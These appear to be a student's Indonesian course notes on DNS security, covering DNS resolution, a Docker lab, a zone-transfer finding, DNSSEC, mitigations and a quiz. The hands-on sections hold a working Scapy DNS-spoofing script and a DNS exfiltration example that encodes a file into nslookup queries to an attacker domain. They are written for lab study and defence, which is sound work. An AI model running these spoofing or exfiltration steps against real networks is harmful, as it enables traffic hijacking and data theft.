# Pertemuan 7 — DNS Security

Catatan ini aku susun dari materi dosen di `Network-Security-Course-Bank/Pertemuan7.md` (judul asli: "Pertemuan 7: DNS Security") plus `Pertemuan7/INDEX.md`, dan konteks hasil praktikum nyata MasPur (bagian DNS pada `materi/laporan-p6.docx`). Temuan praktikum ditandai eksplisit biar kepisah dari materi dosen.

## Pengantar DNS (Domain Name System)

DNS adalah "buku telepon" internet yang menerjemahkan nama domain (seperti `google.com`) menjadi alamat IP (seperti `142.250.190.46`).

> [!IMPORTANT]
> Karena DNS dirancang di masa awal internet, **aspek keamanan awalnya nggak jadi prioritas**. Ini akar semua kerentanan di pertemuan ini: protokolnya cepat, sederhana, dan tanpa autentikasi bawaan.

## Hierarki DNS dan Proses Resolusi

Alur resolusi lengkap:

```
Client → Recursive Resolver (ISP / 8.8.8.8)
           ↓ query
         Root Server (".")
           ↓ "go to TLD"
         TLD Server (".com")
           ↓ "go to authoritative"
         Authoritative Server (google.com NS)
           ↓ "Answer: 142.250.190.46 (TTL 300)"
         Resolver → cache 300 detik → balas ke Client
```

### Waktu resolusi

| Tahap | Perkiraan |
|---|---|
| Client → Resolver | ~1 ms (LAN) |
| Resolver → Root | ~50–100 ms (internet) |
| Root → TLD | ~50–100 ms |
| TLD → Auth | ~50–100 ms |
| Auth → Resolver | ~50–100 ms |
| Resolver → Client | ~1 ms |

**Total:** rata-rata **250–400 ms** untuk query pertama.
**Dengan cache:** **~1–2 ms** untuk query berikutnya.

> [!NOTE]
> Angka cache inilah yang bikin DNS poisoning sangat berbahaya: satu entri palsu yang berhasil masuk ke cache resolver akan melayani **semua** client di belakangnya, bukan cuma satu korban.

## Kerentanan Protokol DNS

| Serangan | Deskripsi |
|---|---|
| **Cache Poisoning** | Memberikan jawaban DNS palsu ke resolver untuk disimpan di cache. |
| **DNS Spoofing** | Memalsukan paket balasan DNS ke client sebelum server asli membalas. |
| **DNS Exfiltration** | Mengirimkan data rahasia melalui query DNS (tunneling). |
| **DDoS Amplification** | Menggunakan DNS untuk memperbesar trafik serangan DoS. |

### Alur DNS poisoning

```
Attacker --[Forge DNS Response SEBELUM yang sah]--> DNS Resolver
Attacker --[Inject fake entry]--> Poisoned Cache

Client --[Query: evil.com?]--> Resolver
Resolver --[Cache hit! Serve poisoned IP]--> Client
Client --[Connect ke IP attacker]--> Attacker
Attacker --[Serve phishing page]--> Client
```

## Docker Hands-On: Setup Lab DNS Security

Topologi — network `192.168.70.0/24`:

| Container | IP | Peran |
|---|---|---|
| `attacker-dns` | 192.168.70.2 | Penyerang (dnschef, scapy) |
| `dns-resolver` | 192.168.70.3:53 | BIND9 — recursive resolver |
| `dns-auth` | 192.168.70.4:5353 | BIND9 — authoritative |
| `web-target` | 192.168.70.5:80 | Apache + `secret.txt` |
| `client-dns` | 192.168.70.6 | Testing client |
| `monitor-dns` | 192.168.70.7 | tcpdump analysis |

```bash
mkdir -p dns-lab && cd dns-lab
docker-compose -f docker-compose-p7.yml up -d
docker-compose -f docker-compose-p7.yml ps

docker-compose exec attacker-dns bash
dig @192.168.70.3 google.com
nslookup example.com 192.168.70.3
```

Pre-configured services:

```bash
# DNS Resolver (BIND9)
dig @192.168.70.3 google.com
rndc dumpdb -cache          # lihat isi cache

# Authoritative NS
dig @192.168.70.4 -p 5353 mycompany.local

# Web target dengan secret
curl http://192.168.70.5/secret.txt
```

### Temuan praktikum MasPur (bukan dari materi dosen)

- **Port DNS di README materi nggak konsisten** (tertulis 5354, compose 5353) → pakai **5353** sesuai docker-compose.
- Server DNS target dalam sesi praktikum diakses di `192.168.70.7`; pengujian `dig`/`nslookup` dari `client-dns` berhasil mengembalikan alamat IP → membuktikan BIND9 mendengarkan **port 53**.
- Query ke authoritative server untuk `www.mycompany.local` dan `secret.mycompany.local` mengembalikan **IP yang sama, `192.168.70.2`**.
- Perekaman trafik DNS dilakukan di `dns-resolver-target` pakai `tcpdump` pada **UDP port 53**, lalu dihitung jumlah paketnya dari file `.pcap`.
- **Latihan lanjutan (dari laporan):** serangan **DNS Zone Transfer (AXFR)** dari `client-dns` ke server `192.168.70.3` untuk domain `mycompany.local` **berhasil mengekspor seluruh catatan DNS** — termasuk server FTP di `192.168.70.99` — karena celah konfigurasi `allow-transfer { any; }`.

> [!WARN]
> Temuan AXFR itu penting: `allow-transfer` yang dibiarkan terbuka bikin seluruh peta internal domain (termasuk host yang nggak seharusnya publik) bocor ke siapa saja. Ini miskonfigurasi yang jauh lebih sering ketemu di dunia nyata daripada cache poisoning klasik.

## Hands-On: DNS Cache Poisoning Simulation

Konsepnya: penyerang menyisipkan entri palsu ke cache server DNS recursive, sehingga semua client yang bertanya ke server itu diarahkan ke IP penyerang. Di lab, ini disimulasikan dengan memalsukan DNS response (`dns_spoof.py`):

```python
from scapy.all import *

def dns_responder(pkt):
    if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNSQR].qname == b"target-site.com.":
        print(f"Mengalihkan {pkt[DNSQR].qname.decode()}...")
        # Buat paket balasan palsu
        spf_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata="192.168.1.100"))
        send(spf_pkt, verbose=0)

print("DNS Spoofer aktif...")
sniff(filter="udp port 53", prn=dns_responder)
```

Kunci serangan: balasan palsu harus datang **sebelum** balasan yang sah.

## Hands-On: DNS Exfiltration dengan Scapy

DNS exfiltration sering dipakai malware buat mencuri data lewat port 53 yang biasanya terbuka di firewall.

**Mekanisme:** data di-encode (mis. Base64) dan disisipkan sebagai subdomain dalam query DNS.

```
data-rahasia.attacker.com  →  ZGF0YS1yYWhhc2lh.attacker.com
```

Sisi korban (mengirim):

```bash
DATA=$(cat /etc/hostname | base64)
nslookup $DATA.lab-attacker.local 192.168.1.100
```

Sisi penyerang (menangkap):

```bash
tcpdump -i eth0 -n udp port 53 -A | grep lab-attacker.local
```

Di praktikum nyata, data dari `/etc/hostname` korban berhasil disisipkan ke subdomain query DNS, ditangkap penyerang, lalu didekode kembali.

> [!TIP]
> Karena DNS jarang diblokir (semua butuh resolusi nama), tunnel lewat query DNS jadi jalur eksfiltrasi favorit malware modern. Pola deteksinya: query dengan subdomain **sangat panjang dan acak** (hasil Base64), sering kali ke domain yang nggak dikenal.

## Mengenal DNSSEC (DNS Security Extensions)

DNSSEC menambahkan **tanda tangan digital** pada data DNS untuk memastikan:

1. **Data Integrity** — data nggak diubah di tengah jalan.
2. **Origin Authentication** — data benar-benar berasal dari server yang sah.

## Deteksi dan Pencegahan

1. **Gunakan DNSSEC** — aktifkan jika didukung pendaftar domain.
2. **Gunakan DNS over HTTPS (DoH)** — mengenkripsi query DNS supaya nggak bisa diintip/dimanipulasi di level ISP.
3. **Konfigurasi firewall** — batasi query DNS keluar hanya ke server DNS yang diizinkan.
4. **Monitoring log** — cari anomali query DNS yang sangat panjang (potensi exfiltration).

## Latihan Mandiri (dari materi)

1. **Analisis query DNS** — pakai Wireshark buat menangkap trafik saat buka browser; perhatikan tipe query (A, AAAA, MX, NS) dan cara server menjawab.
2. **Setup BIND9 yang aman** — batasi rekursi hanya untuk IP internal perusahaan (**ACL**), jangan dibuka ke internet.

> [!WARN]
> Membuka rekursi DNS ke publik adalah undangan terbuka buat penyalahgunaan (amplification & cache poisoning). Batasi lewat ACL, dan matikan zone transfer ke pihak yang nggak berwenang (`allow-transfer`).

```quiz
Q: DNS pada dasarnya menerjemahkan...
+ Nama domain menjadi alamat IP
- Alamat IP menjadi alamat MAC
- Nomor port menjadi nama service
> DNS = sistem penamaan (nama → IP). IP → MAC adalah tugas ARP.

Q: Kenapa protokol DNS rentan menurut materi?
+ DNS dirancang di masa awal internet tanpa memprioritaskan keamanan (tanpa autentikasi bawaan)
- Karena DNS memakai enkripsi RSA yang lemah
- Karena DNS hanya berjalan di IPv6
> Desain awal DNS fokus pada kesederhanaan, bukan keamanan.

Q: DNS cache poisoning berarti...
+ Penyerang menyisipkan jawaban DNS palsu ke cache resolver
- Penyerang mematikan server DNS
- Penyerang mengenkripsi query DNS korban
> Entri palsu yang tersimpan di cache akan melayani semua client di belakang resolver tersebut.

Q: Urutan resolusi DNS yang benar adalah...
+ Resolver → Root → TLD → Authoritative
- Resolver → Authoritative → TLD → Root
- Root → Resolver → Client → TLD
> Resolver bertanya ke root, diarahkan ke TLD, lalu ke server authoritative domain tersebut.

Q: Setelah cache terisi, waktu resolusi DNS turun menjadi sekitar...
+ 1–2 ms
- 250–400 ms
- 1 detik
> Query pertama 250–400 ms; setelah cache hanya ~1–2 ms.

Q: Data integrity dan origin authentication pada data DNS dijamin oleh...
+ DNSSEC
- DoH saja
- HTTP Basic Auth
> DNSSEC menambahkan tanda tangan digital; DoH menyediakan kerahasiaan query, bukan tanda tangan data.

Q: Salah satu indikator kuat adanya DNS exfiltration adalah...
+ Query DNS dengan subdomain sangat panjang dan acak (hasil encoding)
- Query DNS dengan TTL tinggi
- Banyak query ke domain populer
> Data di-encode (mis. Base64) dan dikirim sebagai subdomain, sehingga polanya panjang dan acak.

Q: Keuntungan utama DNS over HTTPS (DoH) adalah...
+ Mengenkripsi query DNS agar tidak bisa diintip atau dimanipulasi di level ISP
- Mempercepat query DNS hingga 1 ms
- Menggantikan DNSSEC
> DoH menyembunyikan isi query dari penyadap di jalur.

Q: Pada praktikum nyata, serangan DNS Zone Transfer (AXFR) terhadap `mycompany.local` berhasil karena...
+ Konfigurasi `allow-transfer { any; }` yang membiarkan siapa saja meminta transfer zona
- Port 53 dalam keadaan tertutup
- DNSSEC dimatikan
> Zone transfer terbuka membocorkan seluruh catatan DNS, termasuk host internal seperti server FTP.

Q: Mitigasi yang tepat untuk mencegah penyalahgunaan resolver DNS oleh pihak luar adalah...
+ Membatasi rekursi hanya untuk IP internal via ACL
- Menonaktifkan pencatatan log DNS
- Mengganti port DNS menjadi 5353
> Membuka rekursi ke publik memudahkan amplification dan cache poisoning; ACL menutup celah itu.
```